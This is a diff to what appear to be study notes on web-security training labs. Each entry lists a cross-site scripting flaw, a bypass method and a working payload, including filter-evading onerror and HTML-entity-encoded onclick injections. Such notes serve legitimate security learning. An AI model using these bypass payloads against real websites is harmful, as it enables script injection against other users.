@@ -76,6 +76,12 @@
 	Method: Craft a JS payload that can be executed without using brackets or angle brackets
 	Payload: 4&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 
+------> Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes 
+	and backslash escaped
+	Flow: Forgot to escape HTML-encoded characters
+	Method: HTML-encode some of the characters in your payload to bypass the escaping function of the application
+	Payload: http://BSH%26apos;);alert(0);//
+
 ------> Lab: Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 	Flow: allows AngularJs codes without proper sanitization
 	Method: injece AngularJs code in the search function
